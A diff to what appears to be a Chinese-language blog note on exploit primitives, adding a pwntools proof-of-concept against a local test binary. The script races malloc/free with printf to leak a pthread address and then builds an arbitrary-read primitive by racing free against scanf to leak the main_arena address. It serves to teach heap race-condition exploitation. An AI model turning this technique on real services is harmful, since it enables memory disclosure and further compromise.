@@ -258,8 +258,77 @@ There are also Relative alternatives, were the attacker controls an offset to a 
 Exploit Primitives are building blocks of complex exploits.
 ```
 **通常获得arbitrary read primitive和arbitrary write primitive，我们就能完成攻击了**<br>
+以1.1的例子为说，写个poc:<br>
+```python
+from pwn import *
+import os
+#context.log_level='debug'
+context.arch = 'amd64'
 
+p = process("./test")
+gdb.attach(p,"continue\n")
+r1 = remote("127.0.0.1",1337)
+r2 = remote("127.0.0.1",1337)
 
+idx = 0
+# race between printf and free-zero_out
+def leak_pthread_addr(r1,r2):
+    global idx
+    while True: # loop until get the pthread leak
+        if os.fork() == 0:
+            for i in range(10000):
+                r1.sendline(b"malloc %d scanf %d AAAAAAAABBBBBBBB free %d" %(idx,idx,idx))
+            os.kill(os.getpid(),9)
+        for i in range(10000):
+            r2.sendline(b"printf %d"%(idx))
+        os.wait() # wait until the child process ends
+        r1.clean()
+        output = r2.clean() # 从远端连接中，清空并返回所有当前接收到的数据。
+        try:
+            leak  = u64(next(x for x in output.split(b"\n") if b"\x7f" in x)[17:].ljust(8,b"\x00"))
+            break
+        except Exception as e:
+            print(e)
+            print("start again !!!")
+    idx += 1
+    return leak
+
+def arbitrary_read(r1,r2,addr):
+    global idx
+    r1.clean()
+    r2.clean() # clean the recv buffer
+    r1.sendline(b"malloc %d malloc %d free %d" %(idx,idx+1,idx+1))
+    while True:
+        if os.fork() == 0:
+            r1.sendline(b"free %d" %(idx))
+            os.kill(os.getpid(),9)
+        r2.sendline((b"scanf %d "%(idx)+p64(addr)+b"\n")*2000)
+        os.wait()# wait until the child process ends
+        r1.sendline(b"malloc %d printf %d" %(idx,idx))
+        r1.recvuntil(b"MESSAGE: ")
+        output = r1.recvline().strip(b"\n")
+        target = p64(addr).split(b"\x00")[0] # fprintf will stop when met \x00
+        if output == target:
+            break
+    idx += 2
+    r1.sendline(b"malloc %d"%(idx+1))
+    r1.clean()
+    r1.sendline(b"printf %d"%(idx+1))
+    r1.recvuntil(b"MESSAGE: ")
+    leak = u64(r1.recvline().strip(b"\n").ljust(8,b"\x00"))
+    return leak
+        
+
+pthread_addr = leak_pthread_addr(r1,r2)
+log.success(f"pthread_addr: {hex(pthread_addr)}")
+main_arena_addr_ptr = pthread_addr - 0x40
+log.success(f"main_arena_addr_ptr: {hex(main_arena_addr_ptr)}")
+main_arena_addr = arbitrary_read(r1,r2,main_arena_addr_ptr)
+log.success(f"main_arena_addr: {hex(main_arena_addr)}")
+
+p.interactive()
+```
+![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250513225213.png)
 
 
 <!-- Google tag (gtag.js) -->
